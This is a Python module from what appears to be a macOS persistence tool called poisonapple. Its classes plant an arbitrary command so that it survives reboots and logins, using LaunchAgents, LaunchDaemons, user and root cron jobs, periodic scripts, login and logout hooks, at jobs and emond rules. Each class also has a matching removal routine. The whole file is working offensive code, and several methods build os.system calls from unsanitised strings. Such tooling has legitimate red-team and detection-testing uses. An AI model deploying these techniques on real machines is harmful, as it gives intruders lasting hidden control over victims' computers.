"""poisonapple.techniques"""

import os

from poisonapple.util import (
    print_status, get_full_path, write_plist, uninstall_plist,
    create_cron_job, remove_line
)


class Technique:
    def __init__(self, technique, name, command, root_required=False):
        self.technique = technique
        self.name = name
        self.command = command
        self.root_required = root_required
        self.success = False
        self.error_message = str()

    def display_result(self):
        if self.success:
            print_status('success', text=self.technique)
        else:
            print_status('failure', text=self.technique)
            print_status('python_error', text=self.error_message)

    @staticmethod
    def execute(func):
        def wrapper(self):
            if self.root_required and not os.geteuid() == 0:
                self.error_message = 'Root access is required for this technique.'
            else:
                try:
                    func(self)
                    self.success = True
                except Exception as e:
                    self.error_message = str(e)
            self.display_result()
        return wrapper


class LaunchAgent(Technique):
    def __init__(self, name, command):
        super().__init__('LaunchAgent', name, command, root_required=True)

    @Technique.execute
    def run(self):
        write_plist(self.name, self.command, 2)

    @Technique.execute
    def remove(self):
        uninstall_plist(self.name, 2)


class LaunchAgentUser(Technique):
    def __init__(self, name, command):
        super().__init__('LaunchAgentUser', name, command, root_required=False)

    @Technique.execute
    def run(self):
        try:
            os.mkdir(os.path.join(f'/Users/{os.getlogin()}', 'Library/LaunchAgents'))
        except FileExistsError:
            pass
        write_plist(self.name, self.command, 1)

    @Technique.execute
    def remove(self):
        uninstall_plist(self.name, 1)


class LaunchDaemon(Technique):
    def __init__(self, name, command):
        super().__init__('LaunchDaemon', name, command, root_required=True)

    @Technique.execute
    def run(self):
        write_plist(self.name, self.command, 3)

    @Technique.execute
    def remove(self):
        uninstall_plist(self.name, 3)


class Cron(Technique):
    def __init__(self, name, command):
        super().__init__('Cron', name, command, root_required=False)

    @Technique.execute
    def run(self):
        create_cron_job(os.getlogin(), self.command, self.name)

    @Technique.execute
    def remove(self):
        remove_line(f'# {self.name}', os.path.join('/usr/lib/cron/tabs/', os.getlogin()))


class CronRoot(Technique):
    def __init__(self, name, command):
        super().__init__('CronRoot', name, command, root_required=True)

    @Technique.execute
    def run(self):
        create_cron_job('root', self.command, self.name)

    @Technique.execute
    def remove(self):
        remove_line(f'# {self.name}', '/usr/lib/cron/tabs/root')


class Periodic(Technique):
    def __init__(self, name, command):
        super().__init__('Periodic', name, command, root_required=True)

    @Technique.execute
    def run(self):
        periodic_path = f'/etc/periodic/daily/666.{self.name}'
        os.system(f'echo "#!/bin/sh" > {periodic_path}')
        os.system(f'echo {self.command} >> {periodic_path}')
        os.system(f'chmod 755 {periodic_path}')

    @Technique.execute
    def remove(self):
        os.remove(f'/etc/periodic/daily/666.{self.name}')


class LoginHook(Technique):
    def __init__(self, name, command):
        super().__init__('LoginHook', name, command, root_required=True)

    @Technique.execute
    def run(self):
        os.system(f'defaults write com.apple.loginwindow LoginHook "{self.command}"')

    @Technique.execute
    def remove(self):
        os.system('defaults delete com.apple.loginwindow LoginHook')


class LogoutHook(Technique):
    def __init__(self, name, command):
        super().__init__('LogoutHook', name, command, root_required=True)

    @Technique.execute
    def run(self):
        os.system(f'defaults write com.apple.loginwindow LogoutHook "{self.command}"')

    @Technique.execute
    def remove(self):
        os.system('defaults delete com.apple.loginwindow LogoutHook')


class AtJob(Technique):
    def __init__(self, name, command):
        super().__init__('AtJob', name, command, root_required=True)

    @Technique.execute
    def run(self):
        os.system('launchctl unload -F /System/Library/LaunchDaemons/com.apple.atrun.plist')
        os.system('launchctl load -w /System/Library/LaunchDaemons/com.apple.atrun.plist')
        # TODO: recurisve at command here?
        os.system(f'{self.command} | at +1 minute')

    @Technique.execute
    def remove(self):
        os.system('launchctl unload -F /System/Library/LaunchDaemons/com.apple.atrun.plist')


class Emond(Technique):
    def __init__(self, name, command):
        super().__init__('Emond', name, command, root_required=True)

    @Technique.execute
    def run(self):
        plist_path = get_full_path('auxiliary/poisonapple.plist')
        trigger_path = get_full_path('auxiliary/poisonapple.sh')
        with open(plist_path) as f:
            plist_data = f.read()
        with open(f'/etc/emond.d/rules/{self.name}.plist', 'w') as f:
            f.write(plist_data.format(trigger_path))
        os.system(f'touch /private/var/db/emondClients/{self.name}')

    @Technique.execute
    def remove(self):
        os.remove(f'/etc/emond.d/rules/{self.name}.plist')
        os.remove(f'/private/var/db/emondClients/{self.name}')


technique_list = [
    AtJob,
    Cron,
    CronRoot,
    Emond,
    LaunchAgent,
    LaunchAgentUser,
    LaunchDaemon,
    LoginHook,
    LogoutHook,
    Periodic,
]